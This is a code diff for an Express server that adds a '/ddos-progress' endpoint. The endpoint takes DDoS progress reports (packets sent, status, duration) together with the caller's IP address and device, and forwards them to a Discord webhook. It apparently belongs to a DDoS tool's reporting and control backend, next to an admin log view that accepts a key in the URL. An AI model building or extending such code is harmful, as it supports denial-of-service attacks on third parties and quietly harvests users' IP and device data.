@@ -188,6 +188,34 @@ app.post('/ddos-report', (req, res) => {
   res.json({ ok: true });
 });
 
+// استقبال تحديثات الديدوس وإرسالها للديسكورد
+app.post('/ddos-progress', (req, res) => {
+  const { packets, status, duration } = req.body || {};
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+
+  if (DISCORD_WEBHOOK) {
+    const color = status === 'success' ? 0x00ff00 : (status === 'failed' ? 0xff0000 : 0xffaa00);
+    fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: `💥 DDoS ${status === 'success' ? 'COMPLETED' : status === 'failed' ? 'FAILED' : 'IN PROGRESS'}`,
+          color: color,
+          fields: [
+            { name: 'Target IP', value: `\`${ip}\``, inline: true },
+            { name: 'Packets Sent', value: `\`${(packets || 0).toLocaleString()}\``, inline: true },
+            { name: 'Duration', value: `\`${duration || 0}s\``, inline: true },
+            { name: 'Device', value: `\`${parseDevice(req.headers['user-agent'] || '')}\``, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    }).catch(() => {});
+  }
+  res.json({ ok: true });
+});
+
 // لوحة التحكم
 app.get('/admin', (req, res) => {
   if (!isAdmin(req)) return res.status(403).send('nope');
@@ -223,6 +251,7 @@ tick(); setInterval(tick, 3000);
   res.send(adminHtml);
 });
 
+// سجلات لوحة التحكم
 app.get('/admin/logs', (req, res) => {
   if (!isAdmin(req) && req.query.key !== ADMIN_KEY) return res.status(403).send('nope');
   res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
